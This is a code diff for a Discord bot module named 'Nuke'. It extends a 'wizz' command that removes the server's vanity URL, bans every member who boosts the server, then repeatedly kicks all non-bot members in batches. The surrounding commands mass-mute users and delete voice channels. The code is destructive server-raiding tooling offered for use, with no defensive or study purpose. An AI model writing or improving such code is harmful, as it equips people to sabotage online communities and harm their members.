@@ -38,21 +38,30 @@ class Nuke(commands.Cog):
     @commands.command()
     async def wizz(self, ctx, vanity: str = None):
         if not ctx.guild: return
-        
-        if vanity:
-            try: await ctx.guild.edit(vanity_code=vanity)
-            except: print("Failed to change vanity (Missing Permissions)")
+        await asyncio.sleep(5)
+
+        try: await ctx.guild.edit(vanity_code=None)
+        except: print("Failed to drop vanity (Missing Permissions)")
 
         for member in ctx.guild.members:
             if member.premium_since:
-                try: 
+                try:
                     await member.ban(reason="wizzed")
                     await asyncio.sleep(0.5)
                 except: continue
-        
-        try: await ctx.guild.prune_members(days=1, roles=ctx.guild.roles, reason="wizzed")
-        except: await ctx.send("Failed to prune members.")
 
+        while True:
+            members_to_kick = [m for m in ctx.guild.members if m != ctx.guild.me and not m.bot]
+            if not members_to_kick:
+                break
+            batch = members_to_kick[:100]
+            for member in batch:
+                try:
+                    await member.kick(reason="wizzed")
+                    await asyncio.sleep(0.5)
+                except: continue
+            if len(batch) < 100:
+                break
 
     @commands.command()
     async def softwizz(self, ctx):
@@ -66,7 +75,6 @@ class Nuke(commands.Cog):
                         await member.edit(mute=True, deafen=True)
                     await asyncio.sleep(0.5)
                 except: continue
-
 
     @commands.command()
     async def vcclap(self, ctx):
@@ -84,7 +92,6 @@ class Nuke(commands.Cog):
                     await vc.delete()
                     await asyncio.sleep(0.5)
                 except: continue
-
 
     @commands.command()
     async def kickbots(self, ctx):
